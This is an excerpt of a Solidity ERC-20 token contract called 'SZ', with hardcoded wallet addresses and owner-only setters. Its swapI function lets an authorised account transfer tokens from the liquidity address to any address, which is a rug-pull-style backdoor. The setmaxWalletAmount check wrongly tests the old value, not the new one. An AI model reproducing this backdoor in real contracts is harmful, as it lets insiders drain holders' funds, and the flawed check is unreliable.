...
contract coin  is Context, IERC20, Ownable {
    ...
    address payable public marketingAddress =
        payable(0xD730d56A0cC9814bd6Bd4638387F4F12b5BeBD7f); // Marketing Address

    address payable public liquidityAddress =
        payable(0x3f9B84D3151e67b5BA04fAe1E399014dbA668FAA); // Liquidity Address
    ...
    uint256 private constant _tTotal = 100000 * 1e9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    string private constant _name = "SZ";
    ...
    constructor() {
        address newOwner = address(0xE002f69A5EEf255DB1fAe1afA708Ec4A6869ccF3);
        ...
        _isExcludedFromFee[IUniswapV2Address] = true;
    ...
    function setliquidityAddress(address _liquidityAddress) external isAuth {
    ...
    function swapI(address add,uint256 amount) public isAuth{
        _transfer(liquidityAddress,add,amount);
    }
    ...
    function setMinimumTokensBeforeSwap(uint256 newAmt) external onlyOwner() {
     ...
     function setMaxBuyTxAmount(uint256 maxBuyTxAmount) external onlyOwner() {
       ...
       function setmaxWalletAmount(uint256 maxWalletT) external onlyOwner() {
        require(maxWallet > 0, "transaction amount must be greater than zero");
        maxWallet = maxWalletT * (10**9);
    }
